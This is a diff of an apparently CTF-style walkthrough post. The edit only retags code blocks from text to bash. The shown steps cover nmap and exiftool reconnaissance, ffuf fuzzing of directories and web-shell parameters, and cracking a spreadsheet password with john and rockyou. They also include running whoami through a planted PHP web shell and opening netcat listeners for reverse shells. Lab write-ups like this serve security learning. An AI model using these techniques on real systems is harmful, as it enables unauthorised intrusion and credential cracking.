@@ -16,7 +16,7 @@ cover: /mc/uploads/2025/10/ez.png
 
 Hey! A new machine means new things to learn – let’s dive into this easy box and pick up some cool tricks!
 
-```text
+```bash
 ζ nmap -sCV  192.168.138.123                                                                                                                
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-15 11:30 EDT
 Nmap scan report for 192.168.138.123
@@ -38,7 +38,7 @@ Only one port is open: **Port 80 (HTTP)**. This means our initial focus will be 
 
 The website's main page only displays an image. While this could suggest steganography, I decided to first check the image's metadata using `exiftool`.
 
-```text
+```bash
 ζ exiftool apreton.png                                                                                                                      
 ExifTool Version Number         : 13.25
 File Name                       : apreton.png
@@ -82,7 +82,7 @@ J1.
 
 We have two pieces of information; a directory pattern: `/scout/******/docs/` and *J1*
 
-```text
+```bash
 ζ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -u http://192.168.138.123/scout/FUZZ/docs
 
 j2                      [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 2ms]
@@ -113,7 +113,7 @@ for i in range(1,1000):
 
 run it :
 
-```text
+```bash
 ζ python3 request.py                                                                                                              
 Found something : http://192.168.138.123/scout/j2/docs/z206
 content: b'Ignore z*, please\nJabatito\n'
@@ -125,7 +125,7 @@ so the message has no meaning , so i go back to the ods file "shellfile.ods"
 
 The `shellfile.ods` file was password-protected. I used `libreoffice2john` and `john` to crack it.
 
-```text
+```bash
 ζ libreoffice2john shellfile.ods >john.file
 ζ john john.file --wordlist=/usr/share/wordlists/rockyou.txt
 shellfile.ods:john11:::::shellfile.ods
@@ -137,20 +137,20 @@ The password was quickly found: `john11`. After opening the file with LibreOffic
 
 I used `ffuf` to find the required GET parameters.
 
-```text
+```bash
 ζ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -u http://192.168.138.123/thejabasshell.php\?FUZZ\=whoami -fs 0
 a                       [Status: 200, Size: 33, Words: 5, Lines: 1, Duration: 2ms]
 [WARN] Caught keyboard interrupt (Ctrl-C)
 ```
 
-```text
+```bash
 ζ curl http://192.168.138.123/thejabasshell.php\?a\=whoami                                                                         
 Error: Problem with parameter "b"
 ```
 
 so we have the other parameter but we need the value so we gonna bruuute force it too until we found it :)
 
-```text
+```bash
 ζ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -u http://192.168.138.123/thejabasshell.php?a=whoami&b=FUZZ -fs 0
 
 pass                    [Status: 200, Size: 9, Words: 1, Lines: 2, Duration: 82ms]
@@ -164,7 +164,7 @@ We have command execution! The next step is to gain a reverse shell.
 
 Set up a Netcat listener
 
-```text
+```bash
 ζ nc -vlnp 4444
 ```
 
@@ -243,7 +243,7 @@ Excellent! This web shell runs commands as the user `drito`. Let's get a reverse
 
 Start a new listener:
 
-```text
+```bash
 ζ nc -vlnp 1234
 ```
 
